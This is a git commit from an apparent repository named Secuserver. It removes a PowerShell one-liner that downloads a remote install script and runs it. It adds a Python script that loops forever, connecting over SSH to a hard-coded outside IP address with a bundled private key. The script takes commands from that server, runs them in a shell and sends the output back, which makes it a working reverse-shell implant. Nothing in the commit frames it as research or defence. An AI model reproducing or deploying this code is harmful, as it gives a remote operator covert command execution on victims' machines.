33d7f21b7122f4831508d4ca3bef74337e166437
NeronNymus <neron.academico@gmail.com>
2024-10-31 15:11:49 -0600

    update

--- install_command.ps1
+++
@@ -1,1 +0,0 @@
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/NeronNymus/Secuserver/main/install.ps1" -OutFile "$env:TEMP\install.ps1"; & "$env:TEMP\install.ps1"
---
+++ light/reverse_ssh_android2_light.py
@@ -0,0 +1,71 @@
+
+
+import os
+import time
+import threading
+import paramiko
+import subprocess
+
+def exec_underlying_command(command):
+    if isinstance(command, bytes):
+        command = command.decode()
+
+    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout, stderr = process.communicate()
+
+    result = None
+    if process.returncode == 0:
+        result = stdout.decode()
+    else:
+        result = stderr.decode()
+
+    return result.strip('\n')
+
+
+def ssh_rev_shell(ip, user, key_file, port=22):
+    client = paramiko.SSHClient()
+
+    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    private_key = paramiko.RSAKey.from_private_key_file(key_file)
+    
+    client.connect(ip, username=user, pkey=private_key, port=port)
+
+    ssh_session = client.get_transport().open_session()
+
+        
+    server_instructions = None
+    if ssh_session.active:
+        server_instructions = ssh_session.recv(1024).decode().strip()
+
+        if server_instructions:
+
+            if server_instructions == 'kill':
+                ssh_session.close()
+                return
+
+            response = exec_underlying_command(server_instructions)
+
+            ssh_session.send(response.encode())
+
+
+            server_instructions = "kill"
+            ssh_session.close()
+            client.close()
+            return
+            
+    client.close()
+
+if __name__ == "__main__":
+
+
+    command = "whoami".encode()
+    user = exec_underlying_command(command)
+
+    while True:
+        try:
+            ssh_rev_shell('34.204.78.186', 'ubuntu', './archenemy_rsa', 64000)
+        except Exception as e:
+            pass
+
+        time.sleep(1)
